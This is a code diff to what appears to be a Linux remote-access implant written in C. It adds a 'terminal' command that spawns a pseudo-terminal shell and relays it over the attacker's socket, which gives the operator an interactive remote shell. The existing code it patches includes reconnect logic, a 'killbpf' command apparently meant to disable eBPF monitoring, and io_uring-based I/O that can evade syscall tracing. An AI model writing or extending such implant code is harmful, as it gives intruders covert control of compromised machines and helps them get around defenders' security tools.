@@ -20,6 +20,14 @@
 #define BUF_SIZE 65536
 #define RECONNECT_TIME 5
 
+//macro to shorten code
+#define SUBMIT_READ(ring, fd, buf) do { \
+    struct io_uring_sqe *s = io_uring_get_sqe(ring); \
+    io_uring_prep_read(s, fd, buf, 8192, 0); \
+    io_uring_sqe_set_data(s, buf); \
+    io_uring_submit(ring); \
+} while (0)
+
 int send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) {
     size_t sent = 0;
     while (sent < len) {
@@ -629,7 +637,39 @@ void cmd_killbpf(struct io_uring *ring, int sockfd) {
 
     send_all(ring, sockfd, out, out_pos);
 }
+void cmd_terminal(struct io_uring *ring, int sockfd) {
+    pid_t child; int master_fd; char buf_sock[8192], buf_pty[8192];
 
+    if ((child = forkpty(&master_fd, NULL, NULL, NULL)) < 0) { write(sockfd, "pty spawn failed\n", 17); exit(1); }
+    if (!child) { const char *sh = getenv("SHELL"); if (!sh) sh = "/bin/sh"; execlp(sh, sh, (char *)NULL); _exit(127); }
+
+    fcntl(master_fd, F_SETFL, fcntl(master_fd, F_GETFL, 0) | O_NONBLOCK);
+    fcntl(sockfd,    F_SETFL, fcntl(sockfd,    F_GETFL, 0) | O_NONBLOCK);
+
+    SUBMIT_READ(ring, sockfd, buf_sock);
+    SUBMIT_READ(ring, master_fd, buf_pty);
+
+    while (1) {
+        struct io_uring_cqe *cqe; if (io_uring_wait_cqe(ring, &cqe) < 0) break;
+        void *data = io_uring_cqe_get_data(cqe); int res = cqe->res; io_uring_cqe_seen(ring, cqe);
+
+        if (data == buf_sock) {
+            if (res <= 0) { shutdown(master_fd, SHUT_WR); break; }
+            for (ssize_t w = 0; w < res;) {
+                ssize_t n = write(master_fd, buf_sock + w, res - w);
+                if (n < 0) { if (errno == EAGAIN || errno == EINTR) continue; shutdown(master_fd, SHUT_WR); break; }
+                w += n;
+            }
+            SUBMIT_READ(ring, sockfd, buf_sock);
+        } else {
+            if (res <= 0 || send_all(ring, sockfd, buf_pty, (size_t)res) <= 0) { shutdown(sockfd, SHUT_WR); break; }
+            SUBMIT_READ(ring, master_fd, buf_pty);
+        }
+    }
+
+    if (child > 0) { kill(child, SIGHUP); waitpid(child, NULL, 0); }
+    close(master_fd); close(sockfd); exit(0);
+}
 void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     sanitize_cmd(cmd);
 
@@ -665,7 +705,10 @@ void process_cmd(struct io_uring *ring, int sockfd, char *cmd) {
     } else if (strncmp(cmd, "killbpf", 7) == 0) {
         cmd_killbpf(ring, sockfd);
 
-    } else if (strncmp(cmd, "exit", 4) == 0) {
+    } else if (!(strncmp(cmd, "terminal", 8))) {
+        cmd_terminal(ring, sockfd);
+
+    }else if (strncmp(cmd, "exit", 4) == 0) {
         cmd_exit(ring, sockfd);
 
     } else {
